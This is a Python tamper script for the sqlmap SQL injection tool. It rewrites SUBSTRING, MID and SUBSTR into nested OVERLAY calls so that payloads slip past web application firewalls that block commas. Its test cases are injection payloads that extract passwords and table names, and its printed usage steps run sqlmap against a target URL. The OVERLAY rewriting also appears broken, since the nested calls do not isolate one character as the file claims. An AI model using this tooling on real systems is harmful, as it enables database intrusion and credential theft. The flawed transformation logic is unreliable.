#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces SUBSTRING with OVERLAY function (without commas)
    
    Tested against:
        * PostgreSQL
        * MySQL (limited support)
    
    Notes:
        * Replaces SUBSTRING(str, pos, len) with nested OVERLAY functions
        * Works without comma characters in the query
        * Useful for bypassing WAF filters that block commas
    
    >>> tamper('SUBSTRING((SELECT password FROM users LIMIT 1) FROM 3 FOR 1)')
    'OVERLAY(OVERLAY((SELECT password FROM users LIMIT 1) PLACING \\'\\' FROM 1 FOR 2) PLACING \\'\\' FROM 2)'
    
    >>> tamper('SUBSTRING(username FROM 1 FOR 1)')
    'OVERLAY(username PLACING \\'\\' FROM 2)'
    
    >>> tamper('SUBSTRING(password,5,1)')
    'OVERLAY(OVERLAY(password PLACING \\'\\' FROM 1 FOR 4) PLACING \\'\\' FROM 2)'
    """
    
    retVal = payload
    
    if payload:
        # Pattern 1: SUBSTRING(string FROM position FOR length)
        # PostgreSQL style
        pattern1 = r'SUBSTRING\s*\(\s*(.+?)\s+FROM\s+(\d+)\s+FOR\s+(\d+)\s*\)'
        
        def replace_postgres_style(match):
            string = match.group(1)
            position = int(match.group(2))
            length = int(match.group(3))
            
            # Only handle single character extraction (length = 1)
            if length != 1:
                return match.group(0)
            
            if position == 1:
                # Special case: first character
                return f"OVERLAY({string} PLACING '' FROM 2)"
            else:
                # General case: position > 1
                return f"OVERLAY(OVERLAY({string} PLACING '' FROM 1 FOR {position - 1}) PLACING '' FROM 2)"
        
        retVal = re.sub(pattern1, replace_postgres_style, retVal, flags=re.IGNORECASE)
        
        # Pattern 2: SUBSTRING(string, position, length)
        # MySQL/Standard style with commas
        pattern2 = r'SUBSTRING\s*\(\s*(.+?)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)'
        
        def replace_mysql_style(match):
            string = match.group(1)
            position = int(match.group(2))
            length = int(match.group(3))
            
            # Only handle single character extraction (length = 1)
            if length != 1:
                return match.group(0)
            
            if position == 1:
                return f"OVERLAY({string} PLACING '' FROM 2)"
            else:
                return f"OVERLAY(OVERLAY({string} PLACING '' FROM 1 FOR {position - 1}) PLACING '' FROM 2)"
        
        retVal = re.sub(pattern2, replace_mysql_style, retVal, flags=re.IGNORECASE)
        
        # Pattern 3: MID(string, position, length) - MySQL alternative
        pattern3 = r'MID\s*\(\s*(.+?)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)'
        retVal = re.sub(pattern3, replace_mysql_style, retVal, flags=re.IGNORECASE)
        
        # Pattern 4: SUBSTR(string, position, length) - Another alternative
        pattern4 = r'SUBSTR\s*\(\s*(.+?)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)'
        retVal = re.sub(pattern4, replace_mysql_style, retVal, flags=re.IGNORECASE)
    
    return retVal


# Test cases for validation
if __name__ == "__main__":
    test_cases = [
        # PostgreSQL style
        "SUBSTRING((SELECT password FROM users LIMIT 1) FROM 3 FOR 1)",
        "SUBSTRING(username FROM 1 FOR 1)",
        "SUBSTRING(database() FROM 5 FOR 1)",
        
        # MySQL style
        "SUBSTRING(password,5,1)",
        "SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)",
        "MID(username,3,1)",
        "SUBSTR(password,2,1)",
        
        # Complex queries
        "AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>65",
        "UNION SELECT SUBSTRING(table_name FROM 1 FOR 1) FROM information_schema.tables",
        
        # Edge cases
        "SUBSTRING(col FROM 1 FOR 1)",
        "SUBSTRING(col,1,1)",
    ]
    
    print("=== SQLMAP TAMPER SCRIPT TEST ===\n")
    
    for i, test in enumerate(test_cases, 1):
        result = tamper(test)
        print(f"Test {i}:")
        print(f"  Original: {test}")
        print(f"  Tampered: {result}")
        print()
    
    print("\n=== USAGE INSTRUCTIONS ===")
    print("""
1. Save this script as 'overlay.py' in SQLMap's tamper directory:
   /path/to/sqlmap/tamper/overlay.py

2. Run SQLMap with the tamper script:
   python sqlmap.py -u "http://target.com/page?id=1" --tamper=overlay

3. Combine with other tampers:
   python sqlmap.py -u "http://target.com/page?id=1" --tamper=overlay,space2comment

4. Use with specific DBMS:
   python sqlmap.py -u "http://target.com/page?id=1" --tamper=overlay --dbms=postgresql

5. Test the tamper:
   python overlay.py

Example transformation:
  Before: SUBSTRING(password,3,1)
  After:  OVERLAY(OVERLAY(password PLACING '' FROM 1 FOR 2) PLACING '' FROM 2)

Benefits:
  ✓ No comma characters in the query
  ✓ Bypasses WAF filters blocking SUBSTRING
  ✓ Works with PostgreSQL OVERLAY function
  ✓ Supports nested subqueries
    """)
